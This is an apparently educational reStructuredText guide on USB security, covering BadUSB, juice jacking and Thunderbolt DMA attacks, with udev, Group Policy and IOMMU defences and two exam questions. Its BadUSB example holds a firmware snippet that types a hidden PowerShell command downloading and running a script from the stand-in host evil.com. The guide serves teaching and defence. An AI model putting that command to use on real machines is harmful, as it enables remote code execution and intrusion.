====================================================================
USB Security - Universal Serial Bus Protection
====================================================================

:Author: Cybersecurity Expert
:Date: January 2026
:Version: 1.0
:Standards: USB 3.2, USB Type-C Authentication

.. contents:: Table of Contents
   :depth: 2

TL;DR - Quick Reference
=======================

**USB Threats:**

- **BadUSB:** Malicious firmware in USB device
- **Juice jacking:** Data theft via charging cables
- **HID injection:** USB acts as keyboard, types malicious commands
- **DMA attacks:** Direct Memory Access bypass OS security

**Defense:**

✅ **USB port control:** Disable autorun, whitelist devices
✅ **USB Type-C Authentication:** Cryptographic device verification
✅ **Charge-only cables:** Data lines disconnected
✅ **IOMMU:** Isolate DMA-capable devices

Introduction
============

**USB Attack Surface:**

- Firmware (can be malicious)
- Descriptors (device claims to be keyboard/storage)
- DMA (PCI Express over Thunderbolt)

BadUSB Attack
==============

.. code-block:: c

    // Malicious USB firmware reprograms to act as keyboard
    void usb_hid_inject_payload(void) {
        // USB device enumerates as keyboard
        usb_set_device_descriptor(USB_CLASS_HID, USB_SUBCLASS_BOOT, USB_PROTOCOL_KEYBOARD);
        
        // Wait for host to recognize
        delay_ms(1000);
        
        // Type malicious commands
        usb_hid_type_string("powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"");
        usb_hid_press_key(KEY_ENTER);
    }

**Defense: USB Device Control**

.. code-block:: bash

    # Linux: Block unauthorized USB devices (udev rule)
    
    # /etc/udev/rules.d/99-usb-whitelist.rules
    # Allow only specific devices
    SUBSYSTEM=="usb", ATTR{idVendor}=="0x1234", ATTR{idProduct}=="0x5678", MODE="0666"
    
    # Block all other USB devices
    SUBSYSTEM=="usb", ACTION=="add", RUN+="/usr/local/bin/block_usb.sh"

**Windows Group Policy:**

.. code-block:: text

    Computer Configuration → Administrative Templates → System → Device Installation → Device Installation Restrictions
    - Enable "Prevent installation of devices not described by other policy settings"
    - Whitelist approved USB devices by VID/PID

DMA Attack (Thunderbolt)
=========================

.. code-block:: text

    Malicious Thunderbolt device → PCI Express → DMA → Read/Write RAM
    
    Attack: DMA read encryption keys from memory
    Defense: IOMMU (Input-Output Memory Management Unit)

**Enable IOMMU:**

.. code-block:: bash

    # Linux kernel parameter
    intel_iommu=on iommu=pt
    
    # Verify IOMMU active
    dmesg | grep -i iommu

Exam Questions
==============

**Q1: USB Type-C Authentication (Medium)**

How does USB Type-C Authentication prevent BadUSB?

**Answer:**

USB Type-C Authentication Protocol (using USB-PD):
1. Device sends certificate to host
2. Host verifies certificate against trusted CA
3. If valid → allow data connection
4. If invalid → charge-only mode

**Limitation:** Requires USB-PD negotiation (not all devices support).

**Q2: Juice Jacking Defense (Easy)**

What is juice jacking and how to prevent?

**Answer:**

**Attack:** Public USB charging station reads data from phone while charging.

**Defense:**
1. **Charge-only cable:** USB data lines (D+/D-) disconnected
2. **USB condom:** Inline adapter blocks data pins
3. **AC adapter:** Use wall charger instead of USB

Standards
=========

- **USB 3.2 Specification**
- **USB Type-C Authentication Specification**

**END OF DOCUMENT**
